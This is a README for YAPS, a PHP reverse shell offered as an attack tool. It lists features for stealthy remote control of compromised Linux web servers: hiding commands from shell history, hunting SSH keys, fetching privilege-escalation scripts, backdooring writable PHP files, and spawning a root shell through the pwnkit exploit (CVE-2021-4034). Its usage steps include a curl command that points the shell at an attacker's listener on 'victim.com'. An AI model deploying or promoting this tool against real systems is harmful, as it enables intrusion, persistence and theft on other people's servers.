# YAPS - **Y**et **A**nother **P**HP **S**hell

![image](https://user-images.githubusercontent.com/3837916/152913972-59b182f7-aa98-4b48-bb60-16dfdcc02fc3.png)


Yes, as the name reveals, this is yet another PHP reverse shell, one more among hundreds available out there, but with some advantages. It is a single PHP file containing all its functions and you can control it via a simple TCP listener (e.g. `nc -lp 1337`).

In the current version (1.4), its main functions support only linux systems, but i'm planning to make it work with Windows too.

It's currently in its first version and I haven't tested it much yet, and *there are still many things I intend to do and improve for the next versions (**it's not done yet!**)*, so please let me know if you've found any bugs or have some suggestion for feature or improvement. =)


## Features
* Single PHP file (no need to install packages, libs, or download tons of files)
* Works with netcat, ncat, socat, multi/handler, almost any listener
* Customizable password protection
* No logs in .bash_history
* Does some enumeration
  * Network info (interfaces, iptables rules, active ports)
  * User info
  * List SUID and GUID files
  *  Search for SSH keys (public and private)
  *  List crontab
  *  List writable PHP files
* Auto download LinPEAS, LinEnum or Linux Exploit Suggester
* Write and run PHP code on remote host
* (Semi) Stabilize shell
* Duplicate connections
* Auto update
* Infect PHP files with backdoors
* **[NEW] Auto reverse root shell via pwnkit (CVE-2021-4034)**

## Cons
* Connection isn't encrypted (yet) (nc does not support SSL)
* Not fully interactive (although you can spawn an interactive shell with `!stabilize`)
  * CTRL+C breaks it; can't use arrows to navigate (unless you use `rlwrap nc -lp <ip> <port>`)

## Usage
1. Set up a TCP listener;
2. Set your IP and port. This can be done by:
* 2.1 Editing the variables at the start of the script;
* 2.2 Setting them via post request (`curl -x POST -d "x=ip:port" victim.com/yaps.php`);
3. Open yaps.php on browser, curl it or run via CLI;
* 3.1 You can set `yaps.php?s` or `yaps.php?silent` to supress the banner
* 3.2 You can run via CLI with `php yaps.php ip port`
5. Hack!

## Working commands
* `!help - Display the help menu`
* `!all-colors - Toggle all colors (compatible with colorless TTY)`
* `!color - Toggle PS1 color (locally only, no environment variable is changed)`
* `!duplicate - Spawn another YAPS connection`
* `!enum - Download LinPEAS and LinEnum to /tmp and get them ready to use`
* `!info - list informations about the target (the enumeration I mentioned above)`
* `!infect - Infect writable PHP files with backdoors`
* `!stabilize - Spawn an interactive reverse shell on another port (works w/ sudo, su, mysql, etc.)`
* `!passwd - Password option (enable, disable, set, modify)`
* `!php - Write and run PHP on the remote host`
* `!suggester - Download Linux Exploit Suggester to /tmp and get it ready to use`
* `!pwnkit - Tries to exploit CVE-2021-4034 and spawn a root revere shell`

## Screenshots

<details>
  <summary>Click to expand screenshots section</summary>

### Current commands:
![image](https://user-images.githubusercontent.com/3837916/152596714-f852a58a-8e19-4869-915a-94316099c6e6.png)

### Some recon:
![image](https://user-images.githubusercontent.com/3837916/127257433-778b1322-c82e-4857-897f-0f3f459dcb2b.png)

### Root reverse shell through CVE-2021-4034
![pwn](https://user-images.githubusercontent.com/3837916/152597200-267704b9-0d50-4bcd-a68f-3c8ea6c74c21.gif)

### Spawning a interactive shell
![stabilize](https://user-images.githubusercontent.com/3837916/127260504-3e78ab69-c3ee-411e-8a7d-f89fe5356a7f.gif)

### Duplicating a YAPS session
![duplicate](https://user-images.githubusercontent.com/3837916/127260519-e672a78e-84c5-4a58-aa39-85dae94d9a50.gif)

### Poisoning PHP files
![infect](https://user-images.githubusercontent.com/3837916/127263363-e286357c-2be0-4890-8895-4bd5adadd3af.gif)

### Writing remote PHP code
![remotephp](https://user-images.githubusercontent.com/3837916/124774830-7dedab80-df14-11eb-9e84-c8d88b9f4de2.png)

### Password protected shell
![passprotected](https://user-images.githubusercontent.com/3837916/127260459-cc50203d-3ba6-408b-af0f-820756e9891d.png)

</details>


## Changelog

**v1.4 - 04/02/2022**
- Added `!pwnkit` to exploit CVE-2021-4034 and spawn a root reverse shell
- Improved `verify_update()` function
- Minor improvements

**v1.3.1 - 01/08/2021**
- Bugs fixed

**v1.3 - 28/07/2021**
- Added `!infect` to infect PHP files with backdoors
- Changed `!stabilize` payload (bugs fixed)

**v1.2.2 - 18/07/2021**
- Changed 'update' function
- Changed 'connect' function
- Improved 'download' function
- Bugs fixed

**v1.2.1 - 17/07/2021**
- Bugs fixed

**v1.2 - 17/07/2021**
- Added `!duplicate` to spawn another shell
- Added update verification (`--update|-u`)
- Added CLI arguments (`--help|-h`)
- Added socket via arguments (`php yaps.php ip port`)
- Changed stabilize shell method (doesn't freeze anymore)
- Changed download method
- Changed connection method via POST (receives a single parameter)

**v1.1 - 12/07/2021**
- Added `!all-colors` to toggle terminal colors and work with colorless TTYs
- Added `exit` command to close socket (leave shell)
- Changed payload in `!stabilize` to unset HISTSIZE and HISTFILE
- Changed the method of obtaining CPU and meminfo in `!info` 

**v1.0.1 - 08/07/2021**
- Changed `[x,y,z]` to `array(x,y,z)` to improve compatibility with older PHP versions
- Changed payload for interactive shell to work with PHP<5.4

## Credits
Some ideas were inspired by this tools:

#### Linpeas
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

#### Linenum
https://github.com/rebootuser/LinEnum

#### Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

#### Pentest Monkey
https://github.com/pentestmonkey/php-reverse-shell

####  Arthepsy exploit for pwnkit
https://github.com/arthepsy/CVE-2021-4034/
